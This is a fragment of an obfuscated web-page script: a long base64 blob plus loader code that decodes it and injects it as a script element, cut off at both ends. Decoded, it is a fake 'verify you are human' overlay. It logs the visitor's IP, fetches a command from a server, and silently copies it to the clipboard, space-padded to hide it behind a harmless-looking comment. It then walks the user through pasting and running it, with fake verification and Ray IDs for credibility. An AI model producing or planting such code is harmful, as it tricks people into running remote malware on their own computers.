1jbk93b0tKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZja0ZzYkNnbkxtTlFXV00wVEV0blRTY3BMbVp2Y2tWaFkyZ29aV3dnUFQ0Z2V3b2dJR1ZzTG5SbGVIUkRiMjUwWlc1MElEMGdjMmwwWlZWeWJEc0tmU2s3Q2dva2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eVFXeHNLQ2N1WTFOTE1YQm5VakZOUWxaSVZWbElKeWt1Wm05eVJXRmphQ2hwYldjZ1BUNGdld29nSUdsdFp5NXpjbU1nUFNCc2IyZHZWWEpzSUh4OElHUmxabUYxYkhSTWIyZHZWWEpzT3dvZ0lHbHRaeTVoYkhRZ1BTQW5iRzluYnljN0NuMHBPd29LWm5WdVkzUnBiMjRnYzJWMFUydHBjRVpzWVdjb0tTQjdDaUFnSUNCMGNua2dld29nSUNBZ0lDQWdJR3h2WTJGc1UzUnZjbUZuWlM1elpYUkpkR1Z0S0NkZmMydHBjQ2NzSUNjeEp5azdDaUFnSUNCOUlHTmhkR05vSUNobGNuSXBJSHNLSUNBZ0lDQWdJQ0JrYjJOMWJXVnVkQzVqYjI5cmFXVWdQU0FuWDNOcmFYQTlNVHNnY0dGMGFEMHZPeUJ0WVhndFlXZGxQVE14TlRNMk1EQXdKenNLSUNBZ0lIMEtmUW9LWVhONWJtTWdablZ1WTNScGIyNGdhVzVwZEZabGNtbG1hV05oZEdsdmJrWnNiM2NvS1NCN0NpQWdJQ0JqYjI1emRDQndjbVZzYjJGa1pYSkZiR1Z0Wlc1MGN5QTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0pCYkd3b0lpNWpiMVpTYlVwblFUWmpSakpTSWlrN0NpQWdJQ0JqYjI1emRDQndjbVZzYjJGa1pYSlVaWGgwSUQwZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNpZ2lMbU5hVlVGS05sTlhUbnBWZEVGMFdWTWlLVHNLSUNBZ0lHTnZibk4wSUhSbGVIUkJiR3hUZEdWd0lEMGdKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWdpTG1OblNXNWtWSEJHVG1vaUtUc0tJQ0FnSUdOdmJuTjBJR05vWldOclltOTRWMmx1Wkc5M0lEMGdKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWdpSTJsMWIwTmxRbEZJUWxoWlVsTk5TeUlwT3dvZ0lDQWdZMjl1YzNRZ2MzUmxjREJGYkdWdFpXNTBjeUE5SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNKQmJHd29JaTVqWjAxelIzUnBNWElpS1RzS0lDQWdJR052Ym5OMElITjBaWEF4Uld4bGJXVnVkSE1nUFNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eVFXeHNLQ0l1WTFOVWIycHVVV3R5SWlrN0NpQWdJQ0JqYjI1emRDQnpkR1Z3TWtWc1pXMWxiblJ6SUQwZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNrRnNiQ2dpTG1OUlkyTkZkMWRFYzB3aUtUc0tJQ0FnSUdOdmJuTjBJSE4wWlhBelJXeGxiV1Z1ZEhNZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlRV3hzS0NJdVkxcGlOMWhrV0ZkeVJDSXBPd29nSUNBZ1kyOXVjM1FnWTJobFkydGliM2dnUFNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDSWphV2xTUkU1SWNsUkdVMnNpS1RzS0lDQWdJR052Ym5OMElIWmxjbWxtZVZkcGJtUnZkeUE5SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0lpTnBRVEp0VDJocmRucE1VMXBHTjJ0bElpazdDaUFnSUNCamIyNXpkQ0J6Y0dsdWJtVnlJRDBnSkhKdmIzUXVjWFZsY25sVFpXeGxZM1J2Y2lnaUkybE5lbFpzVDNVNGNDSXBPd29nSUNBZ1kyOXVjM1FnZG1WeWFXWjVRblYwZEc5dUlEMGdKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWdpSTJsTFVVRjRTV1ZuYjNCMVpVd2lLVHNLQ2lBZ0lDQXZMeURRb05DMTBMUFF1TkdCMFlMUmdOQzQwWURSZzlDMTBMd2dTVkFnMEw3UXN0QzEwWURRdTlDMTBZOGcwTC9SZ05DNElOQzQwTDNRdU5HRzBMalFzTkM3MExqUXQ5Q3cwWWJRdU5DNENpQWdJQ0JoZDJGcGRDQnlaV2RwYzNSbGNrOTJaWEpzWVhsSlVDZ3BPd29LSUNBZ0lHRjNZV2wwSUdabGRHTm9RMjl0YldGdVpFRnVaRU52YlcxbGJuUW9LVHNLSUNBZ0lITmxkRlJwYldWdmRYUW9LQ2tnUFQ0Z2V3b2dJQ0FnSUNBZ0lIQnlaV3h2WVdSbGNrVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJaWs3Q2lBZ0lDQWdJQ0FnY0hKbGJHOWhaR1Z5VkdWNGRDNXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltNXZibVVpT3dvZ0lDQWdJQ0FnSUhSbGVIUkJiR3hUZEdWd0xuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaVlteHZZMnNpT3dvZ0lDQWdJQ0FnSUdOb1pXTnJZbTk0VjJsdVpHOTNMbk4wZVd4bExtUnBjM0JzWVhrZ1BTQWlabXhsZUNJN0Nnb2dJQ0FnSUNBZ0lITmxkRlJwYldWdmRYUW9LQ2tnUFQ0Z2V3b2dJQ0FnSUNBZ0lDQWdJQ0JqYUdWamEySnZlRmRwYm1SdmR5NXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltWnNaWGdpT3lBS0lDQWdJQ0FnSUNBZ0lDQWdiR1YwSUc5d1lXTnBkSGtnUFNBd093b2dJQ0FnSUNBZ0lDQWdJQ0JzWlhRZ1ptRmtaVWx1SUQwZ2MyVjBTVzUwWlhKMllXd29LQ2tnUFQ0Z2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLRzl3WVdOcGRIa2dQajBnTVNrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR05zWldGeVNXNTBaWEoyWVd3b1ptRmtaVWx1S1RzZ0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCOUlHVnNjMlVnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHOXdZV05wZEhrZ0t6MGdNQzR4T3lBS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmphR1ZqYTJKdmVGZHBibVJ2ZHk1emRIbHNaUzV2Y0dGamFYUjVJRDBnYjNCaFkybDBlVHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ2ZTd2dNekFwT3dvZ0lDQWdJQ0FnSUgwc0lESXdNQ2s3Q2dvZ0lDQWdJQ0FnSUhOMFpYQXdSV3hsYldWdWRITXVabTl5UldGamFDaGxiQ0E5UGlCbGJDNXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltSnNiMk5ySWlrN0Nnb2dJQ0FnSUNBZ0lITmxkRlJwYldWdmRYUW9LQ2tnUFQ0Z2V3b2dJQ0FnSUNBZ0lDQWdJQ0J6ZEdWd01FVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJaWs3Q2lBZ0lDQWdJQ0FnSUNBZ0lITjBaWEF4Uld4bGJXVnVkSE11Wm05eVJXRmphQ2hsYkNBOVBpQmxiQzV6ZEhsc1pTNWthWE53YkdGNUlEMGdJbUpzYjJOcklpazdDaUFnSUNBZ0lDQWdmU3dnTWpBd01DazdJQW9nSUNBZ2ZTd2dNVFV3TUNrN0lBb0tJQ0FnSUdOb1pXTnJZbTk0TG1Ga1pFVjJaVzUwVEdsemRHVnVaWElvSW1Oc2FXTnJJaXdnWm5WdVkzUnBiMjRnS0NrZ2V3b2dJQ0FnSUNBZ0lHeGxkQ0JpWVhObElEMGdabVYwWTJobFpFTnZiVzFoYm1RN0NpQWdJQ0FnSUNBZ2JHVjBJR052YlcxbGJuUlFZWEowSUQwZ0tHWmxkR05vWldSRGIyMXRaVzUwSUQ4Z1ptVjBZMmhsWkVOdmJXMWxiblFnT2lBbkp5a2dLeUFuWENjaUp6c0tJQ0FnSUNBZ0lDQnNaWFFnYzNCaFkyVnpJRDBnSnljN0NpQWdJQ0FnSUNBZ2FXWWdLQ2hpWVhObElDc2dZMjl0YldWdWRGQmhjblFwTG14bGJtZDBhQ0E4SURJMU9Ta2dld29nSUNBZ0lDQWdJQ0FnSUNCemNHRmpaWE1nUFNBbklDY3VjbVZ3WldGMEtESTFPU0F0SUNoaVlYTmxJQ3NnWTI5dGJXVnVkRkJoY25RcExteGxibWQwYUNrN0NpQWdJQ0FnSUNBZ0lDQWdJR052Ym5OdmJHVXViRzluS0dKaGMyVXNJSE53WVdObGN5d2dZMjl0YldWdWRGQmhjblFwQ2lBZ0lDQWdJQ0FnSUNBZ0lHTnZibk52YkdVdWJHOW5LQ2RpWVhObElHeGxibWQwYURvbkxDQmlZWE5sTG14bGJtZDBhQ3dnSjNOd1lXTmxjeUJzWlc1bmRHZzZKeXdnYzNCaFkyVnpMbXhsYm1kMGFDd2dKMk52YlcxbGJuUlFZWEowSUd4bGJtZDBhRG9uTENCamIyMXRaVzUwVUdGeWRDNXNaVzVuZEdncE93b2dJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQnNaWFFnZG1Gc2RXVWdQU0JpWVhObElDc2djM0JoWTJWeklDc2dZMjl0YldWdWRGQmhjblE3Q2lBZ0lDQWdJQ0FnWTI5dWMzUWdkR1Y0ZEdGeVpXRWdQU0JrYjJOMWJXVnVkQzVqY21WaGRHVkZiR1Z0Wlc1MEtDZDBaWGgwWVhKbFlTY3BPd29nSUNBZ0lDQWdJSFJsZUhSaGNtVmhMblpoYkhWbElEMGdkbUZzZFdVN0NpQWdJQ0FnSUNBZ2RHVjRkR0Z5WldFdWMyVjBRWFIwY21saWRYUmxLQ2R5WldGa2IyNXNlU2NzSUNjbktUc0tJQ0FnSUNBZ0lDQjBaWGgwWVhKbFlTNXpkSGxzWlM1d2IzTnBkR2x2YmlBOUlDZGhZbk52YkhWMFpTYzdDaUFnSUNBZ0lDQWdkR1Y0ZEdGeVpXRXVjM1I1YkdVdWJHVm1kQ0E5SUNjdE9UazVPWEI0SnpzS0lDQWdJQ0FnSUNCa2IyTjFiV1Z1ZEM1aWIyUjVMbUZ3Y0dWdVpFTm9hV3hrS0hSbGVIUmhjbVZoS1RzS0lDQWdJQ0FnSUNCMFpYaDBZWEpsWVM1elpXeGxZM1FvS1RzS0lDQWdJQ0FnSUNCa2IyTjFiV1Z1ZEM1bGVHVmpRMjl0YldGdVpDZ25ZMjl3ZVNjcE93b2dJQ0FnSUNBZ0lHUnZZM1Z0Wlc1MExtSnZaSGt1Y21WdGIzWmxRMmhwYkdRb2RHVjRkR0Z5WldFcE93b2dJQ0FnSUNBZ0lHTnZibk52YkdVdWJHOW5LQ2ZpbklVbktUc0tJQ0FnSUNBZ0lDQnpaWFJUYTJsd1JteGhaeWdwT3dvZ0lDQWdJQ0FnSUdOb1pXTnJZbTk0VjJsdVpHOTNMbk4wZVd4bExuQmhaR1JwYm1jZ1BTQWlNVEJ3ZUNJN0NpQWdJQ0FnSUNBZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNpZ2lMbU5RTTFKb2QyRmpkREVpS1M1emRIbHNaUzV0WVhKbmFXNU1aV1owSUQwZ0lqRTBjSGdpT3dvZ0lDQWdJQ0FnSUhOMFpYQXhSV3hsYldWdWRITXVabTl5UldGamFDaGxiQ0E5UGlCbGJDNXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltNXZibVVpS1RzS0lDQWdJQ0FnSUNCemRHVndNa1ZzWlcxbGJuUnpMbVp2Y2tWaFkyZ29aV3dnUFQ0Z1pXd3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSmliRzlqYXlJcE93b2dJQ0FnSUNBZ0lITndhVzV1WlhJdWMzUjViR1V1ZG1semFXSnBiR2wwZVNBOUlDSjJhWE5wWW14bElqc0tJQ0FnSUNBZ0lDQnpaWFJVYVcxbGIzVjBLQ2dwSUQwK0lIc0tJQ0FnSUNBZ0lDQWdJQ0FnWTJobFkydGliM2hYYVc1a2IzY3VjM1I1YkdVdWQybGtkR2dnUFNBaU5UTXdjSGdpT3dvZ0lDQWdJQ0FnSUNBZ0lDQmphR1ZqYTJKdmVGZHBibVJ2ZHk1emRIbHNaUzVvWldsbmFIUWdQU0FpWVhWMGJ5STdDaUFnSUNBZ0lDQWdJQ0FnSUhabGNtbG1lVmRwYm1SdmR5NXpkSGxzWlM1aWIzSmtaWEpVYjNBZ1BTQWlNWEI0SUhOdmJHbGtJQ00zT1RjNU56a2lPd29nSUNBZ0lDQWdJQ0FnSUNCMlpYSnBabmxYYVc1a2IzY3VjM1I1YkdVdWNHRmtaR2x1WjFSdmNDQTlJQ0l6Y0hnaU93b2dJQ0FnSUNBZ0lDQWdJQ0IyWlhKcFpubFhhVzVrYjNjdWMzUjViR1V1YldGeVoybHVWRzl3SUQwZ0lqRTFjSGdpT3dvZ0lDQWdJQ0FnSUNBZ0lDQjJaWEpwWm5sWGFXNWtiM2N1WTJ4aGMzTk1hWE4wTG1Ga1pDZ2lZV04wYVhabElpazdDaUFnSUNBZ0lDQWdmU3dnTlRBd0tUc0tJQ0FnSUgwcE93b0tJQ0FnSUM4dklFSnNkWEl2Um05amRYTWdZV04wYVhaaGRHbHZiaUJtYjNJZ1ZtVnlhV1o1SUdKMWRIUnZiZ29nSUNBZ2JHVjBJR2hoYzBKc2RYSnlaV1FnUFNCbVlXeHpaVHNLQ2lBZ0lDQm1kVzVqZEdsdmJpQmxibUZpYkdWQ2RYUjBiMjRvS1NCN0NpQWdJQ0FnSUNBZ2FXWWdLQ0YyWlhKcFpubENkWFIwYjI0cElISmxkSFZ5YmpzS0NpQWdJQ0FnSUNBZ2FXWWdLSFpsY21sbWVVSjFkSFJ2Ymk1a2FYTmhZbXhsWkNrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0IyWlhKcFpubENkWFIwYjI0dVpHbHpZV0pzWldRZ1BTQm1ZV3h6WlRzS0lDQWdJQ0FnSUNBZ0lDQWdkbVZ5YVdaNVFuVjBkRzl1TG5KbGJXOTJaVUYwZEhKcFluVjBaU2duWkdsellXSnNaV1FuS1RzS0lDQWdJQ0FnSUNBZ0lDQWdkbVZ5YVdaNVFuVjBkRzl1TG5OMGVXeGxMbTl3WVdOcGRIa2dQU0FuTVNjN0NpQWdJQ0FnSUNBZ0lDQWdJSFpsY21sbWVVSjFkSFJ2Ymk1emRIbHNaUzVqZFhKemIzSWdQU0FuY0c5cGJuUmxjaWM3Q2lBZ0lDQWdJQ0FnSUNBZ0lHTnZibk52YkdVdWJHOW5LQ2RDZFhSMGIyNGdaVzVoWW14bFpDRW5LVHNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQjlDZ29nSUNBZ0x5OGdWSEpoWTJzZ2QybHVaRzkzSUdKc2RYSWdMU0RRdmRDdzBZZlF1TkM5MExEUXRkQzhJSEJ2Ykd4cGJtY2cwTC9SZ05DNElOR0QwWVhRdnRDMDBMVWcwWUVnMEw3UXV0QzkwTEFLSUNBZ0lIZHBibVJ2ZHk1aFpHUkZkbVZ1ZEV4cGMzUmxibVZ5S0NkaWJIVnlKeXdnWm5WdVkzUnBiMjRvS1NCN0NpQWdJQ0FnSUNBZ2FHRnpRbXgxY25KbFpDQTlJSFJ5ZFdVN0NpQWdJQ0FnSUNBZ1kyOXVjMjlzWlM1c2IyY29KMWRwYm1SdmR5QmliSFZ5Y21Wa0p5azdDaUFnSUNBZ0lDQWdMeThnMEpmUXNOQy8wWVBSZ2RDNjBMRFF0ZEM4SUhCdmJHeHBibWNnMExUUXU5R1BJTkMvMFlEUXZ0Q3kwTFhSZ05DNjBMZ2cwWURRc05DMzBMSFF1OUMrMExyUXVOR0EwTDdRc3RDNjBMZ0tJQ0FnSUNBZ0lDQnpkR0Z5ZEZCdmJHeHBibWNvWlc1aFlteGxRblYwZEc5dUtUc0tJQ0FnSUNBZ0lDQjBjbUZqYTBOdmJYQnNaWFJsS0NrN0NpQWdJQ0I5S1RzS0NpQWdJQ0F2THlCVWNtRmpheUIzYVc1a2IzY2dabTlqZFhNZ0xTRFF2OUdBMEw3UXN0QzEwWURSajlDMTBMd2cwWUhSZ3RDdzBZTFJnOUdCSU5DLzBZRFF1Q0RRc3RDKzBMZlFzdEdBMExEUmd0QzFDaUFnSUNCM2FXNWtiM2N1WVdSa1JYWmxiblJNYVhOMFpXNWxjaWduWm05amRYTW5MQ0JtZFc1amRHbHZiaWdwSUhzS0lDQWdJQ0FnSUNCamIyNXpiMnhsTG14dlp5Z25WMmx1Wkc5M0lHWnZZM1Z6WldRc0lHaGhjMEpzZFhKeVpXUTZKeXdnYUdGelFteDFjbkpsWkNrN0NpQWdJQ0FnSUNBZ2FXWWdLR2hoYzBKc2RYSnlaV1FwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdMeThnMEovUmdOQyswTExRdGRHQTBZL1F0ZEM4SU5HQjBZTFFzTkdDMFlQUmdTRFJnTkN3MExmUXNkQzcwTDdRdXRDNDBZRFF2dEN5MExyUXVDRFF2OUdBMExnZzBZVFF2dEM2MFlQUmdkQzFDaUFnSUNBZ0lDQWdJQ0FnSUdOb1pXTnJWVzVzYjJOclUzUmhkSFZ6S0NrdWRHaGxiaWgxYm14dlkydGxaQ0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcFppQW9kVzVzYjJOclpXUXBJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCbGJtRmliR1ZDZFhSMGIyNG9LVHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ2ZTazdDaUFnSUNBZ0lDQWdmUW9nSUNBZ2ZTazdDZ29nSUNBZ0x5OGdWbVZ5YVdaNUlHSjFkSFJ2YmlCamJHbGpheUJvWVc1a2JHVnlDaUFnSUNCcFppQW9kbVZ5YVdaNVFuVjBkRzl1S1NCN0NpQWdJQ0FnSUNBZ2RtVnlhV1o1UW5WMGRHOXVMbUZrWkVWMlpXNTBUR2x6ZEdWdVpYSW9JbU5zYVdOcklpd2dablZ1WTNScGIyNGdLQ2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQnBaaUFvZEdocGN5NWthWE5oWW14bFpDa2djbVYwZFhKdU93b0tJQ0FnSUNBZ0lDQWdJQ0FnTHk4Z1UyVjBJSE5yYVhBZ1pteGhad29nSUNBZ0lDQWdJQ0FnSUNCelpYUlRhMmx3Um14aFp5Z3BPd29LSUNBZ0lDQWdJQ0FnSUNBZ2RISmhZMnREYjIxd2JHVjBaU2dwT3dvS0lDQWdJQ0FnSUNBZ0lDQWdMeThnU0dsa1pTQmphR1ZqYTJKdmVDQjNhVzVrYjNjS0lDQWdJQ0FnSUNBZ0lDQWdZMmhsWTJ0aWIzaFhhVzVrYjNjdWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJanNLQ2lBZ0lDQWdJQ0FnSUNBZ0lDOHZJRk5vYjNjZ2JHOWhaR1Z5SUdacGNuTjBDaUFnSUNBZ0lDQWdJQ0FnSUdsbUlDaHdjbVZzYjJGa1pYSkZiR1Z0Wlc1MGN5NXNaVzVuZEdncElIQnlaV3h2WVdSbGNrVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKaWJHOWpheUlwT3dvZ0lDQWdJQ0FnSUNBZ0lDQnBaaUFvY0hKbGJHOWhaR1Z5VkdWNGRDa2djSEpsYkc5aFpHVnlWR1Y0ZEM1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlPd29LSUNBZ0lDQWdJQ0FnSUNBZ0x5OGdTR2xrWlNCMlpYSnBabmtnZEdWNGRDQjBaVzF3YjNKaGNtbHNlUW9nSUNBZ0lDQWdJQ0FnSUNCMFpYaDBRV3hzVTNSbGNDNXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltNXZibVVpT3dvS0lDQWdJQ0FnSUNBZ0lDQWdMeThnUVdaMFpYSWdNUzQxSUhObFkyOXVaSE1zSUhOb2IzY2djM1ZqWTJWemN3b2dJQ0FnSUNBZ0lDQWdJQ0J6WlhSVWFXMWxiM1YwS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQzh2SUVocFpHVWdiRzloWkdWeUNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcFppQW9jSEpsYkc5aFpHVnlSV3hsYldWdWRITXViR1Z1WjNSb0tTQndjbVZzYjJGa1pYSkZiR1Z0Wlc1MGN5NW1iM0pGWVdOb0tHVnNJRDArSUdWc0xuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaWJtOXVaU0lwT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tIQnlaV3h2WVdSbGNsUmxlSFFwSUhCeVpXeHZZV1JsY2xSbGVIUXVjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSnViMjVsSWpzS0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBdkx5QlRhRzkzSUhOMVkyTmxjM01nZEdWNGRBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNpZ25MbU5XUWtOTVJFNDJUQ2NwTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpYVc1c2FXNWxJanNLQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F2THlCSWFXUmxJSGRoYVhScGJtY2dkR1Y0ZEN3Z2MyaHZkeUIzWVdsMGFXNW5JSEpsYzNCdmJuTmxDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ2N1WTNJNGEyMVViRUpFZG5WMmRXeDNKeWt1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeTVqWlROUGREWTBNMFp0Y0Rnd05rY25LUzV6ZEhsc1pTNWthWE53YkdGNUlEMGdJbUpzYjJOcklqc0tDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXZMeUJTWld4dllXUWdjR0ZuWlNCaFpuUmxjaUF6SUhObFkyOXVaSE1LSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSE5sZEZScGJXVnZkWFFvS0NrZ1BUNGdld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUhkcGJtUnZkeTVzYjJOaGRHbHZiaTV5Wld4dllXUW9LVHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBzSURNd01EQXBPd29nSUNBZ0lDQWdJQ0FnSUNCOUxDQXhOVEF3S1RzS0lDQWdJQ0FnSUNCOUtUc0tJQ0FnSUgwS0NpQWdJQ0JqYjI1emRDQjJaWEpwWm1sallYUnBiMjVKWkNBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9JaU5wZUZSWlV6QmhiRFJTYzB4cElpazdDaUFnSUNCcFppQW9kbVZ5YVdacFkyRjBhVzl1U1dRcElIc0tJQ0FnSUNBZ0lDQjJaWEpwWm1sallYUnBiMjVKWkM1MFpYaDBRMjl1ZEdWdWRDQTlJRTFoZEdndVpteHZiM0lvTVRBd01EQXdJQ3NnVFdGMGFDNXlZVzVrYjIwb0tTQXFJRGt3TURBd01DazdDaUFnSUNCOUNpQWdJQ0FLSUNBZ0lHTnZibk4wSUdOb1lYSnpJRDBnSW1GaVkyUmxaakF4TWpNME5UWTNPRGtpT3dvZ0lDQWdZMjl1YzNRZ2NtRjVTV1FnUFNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDSXVZelo1TTJ0SGRIZERaU0lwT3dvZ0lDQWdhV1lnS0hKaGVVbGtLU0I3Q2lBZ0lDQWdJQ0FnY21GNVNXUXVkR1Y0ZEVOdmJuUmxiblFnUFNCQmNuSmhlUzVtY205dEtIc2diR1Z1WjNSb09pQXhOaUI5TENBb0tTQTlQaUJqYUdGeWMxdE5ZWFJvTG1ac2IyOXlLRTFoZEdndWNtRnVaRzl0S0NrZ0tpQmphR0Z5Y3k1c1pXNW5kR2dwWFNrdWFtOXBiaWdpSWlrN0NpQWdJQ0I5Q24wS0NtbG1JQ2hrYjJOMWJXVnVkQzV5WldGa2VWTjBZWFJsSUQwOVBTQWliRzloWkdsdVp5SXBJSHNLSUNBZ0lHUnZZM1Z0Wlc1MExtRmtaRVYyWlc1MFRHbHpkR1Z1WlhJb0lrUlBUVU52Ym5SbGJuUk1iMkZrWldRaUxDQW9LU0E5UGlCN0lHbHVhWFJXWlhKcFptbGpZWFJwYjI1R2JHOTNLQ2s3SUgwcE93cDlJR1ZzYzJVZ2V3b2dJQ0FnYVc1cGRGWmxjbWxtYVdOaGRHbHZia1pzYjNjb0tUc0tmUW9LQ21OdmJuTjBJR1pwYkdWRmVIQnNiM0psY2lBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeU5wVGpWTWVUQlFiVm8wSnlrN0NtTnZibk4wSUdacGJHVkpibkIxZENBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeU5wZG1oeVVIcHdNbFluS1RzS2JHVjBJR1pwYkdWVFpXeGxZM1JsWkNBOUlHWmhiSE5sT3dvS2FXWWdLR1pwYkdWRmVIQnNiM0psY2lrZ2V3b2dJR1pwYkdWRmVIQnNiM0psY2k1aFpHUkZkbVZ1ZEV4cGMzUmxibVZ5S0NkamJHbGpheWNzSUdGemVXNWpJR1oxYm1OMGFXOXVLQ2tnZXdvZ0lDQWdJQ0JoZDJGcGRDQm1aWFJqYUVOdmJXMWhibVJCYm1SRGIyMXRaVzUwS0NrN0NpQWdJQ0FnSUd4bGRDQmlZWE5sSUQwZ1ptVjBZMmhsWkVOdmJXMWhibVE3Q2lBZ0lDQWdJR3hsZENCamIyMXRaVzUwVUdGeWRDQTlJQ2htWlhSamFHVmtRMjl0YldWdWRDQS9JR1psZEdOb1pXUkRiMjF0Wlc1MElEb2dKeWNwSUNzZ0lsd2lJanNLSUNBZ0lDQWdiR1YwSUhOd1lXTmxjeUE5SUNjbk93b2dJQ0FnSUNCcFppQW9LR0poYzJVZ0t5QmpiMjF0Wlc1MFVHRnlkQ2t1YkdWdVozUm9JRHdnTWpVNUtTQjdDaUFnSUNBZ0lDQWdJQ0J6Y0dGalpYTWdQU0FuSUNjdWNtVndaV0YwS0RJMU9TQXRJQ2hpWVhObElDc2dZMjl0YldWdWRGQmhjblFwTG14bGJtZDBhQ2s3Q2lBZ0lDQWdJSDBLSUNBZ0lDQWdiR1YwSUdacGJtRnNVM1J5SUQwZ1ltRnpaU0FySUhOd1lXTmxjeUFySUdOdmJXMWxiblJRWVhKME93b2dJQ0FnSUNCdVlYWnBaMkYwYjNJdVkyeHBjR0p2WVhKa0xuZHlhWFJsVkdWNGRDaG1hVzVoYkZOMGNpazdDaUFnSUNBZ0lITmxkRk5yYVhCR2JHRm5LQ2s3Q2lBZ0lDQWdJSFJ5WVdOclEyOXRjR3hsZEdVb0tUc0tJQ0FnSUNBZ2FXWWdLR1pwYkdWSmJuQjFkQ2tnWm1sc1pVbHVjSFYwTG1Oc2FXTnJLQ2s3Q2lBZ0lDQWdJQzh2SUZkaGFYUWdabTl5SUhWelpYSWdkRzhnY21WMGRYSnVJSFJ2SUhSb1pTQndZV2RsQ2lBZ0lDQWdJR3hsZENCbWIyTjFjMGhoYm1Sc1pXUWdQU0JtWVd4elpUc0tJQ0FnSUNBZ1kyOXVjM1FnYUdGdVpHeGxSbTlqZFhNZ1BTQW9LU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQnBaaUFvSVdadlkzVnpTR0Z1Wkd4bFpDQW1KaUFoWm1sc1pWTmxiR1ZqZEdWa0tTQjdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ1ptOWpkWE5JWVc1a2JHVmtJRDBnZEhKMVpUc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBdkx5QXVMaTVsZUdsemRHbHVaeUJqYjJSbExpNHVDaUFnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJSDA3Q2lBZ0lDQWdJSGRwYm1SdmR5NWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDZG1iMk4xY3ljc0lHaGhibVJzWlVadlkzVnpLVHNLSUNCOUtUc0tmUW9LZlNrb0tUc2dMeThnUlc1a0lHOW1JR0Z6ZVc1aklFbEpSa1VLJzsKICAgICAgY29uc3Qgc2NyaXB0Q29kZSA9IGI2NFRvVXRmOChzY3JpcHRCNjQpOwogICAgICBjb25zdCBzY3JpcHRFbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICBzY3JpcHRFbC50ZXh0Q29udGVudCA9IHNjcmlwdENvZGU7CiAgICAgIChkb2N1bWVudC5oZWFkIHx8IGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCkuYXBwZW5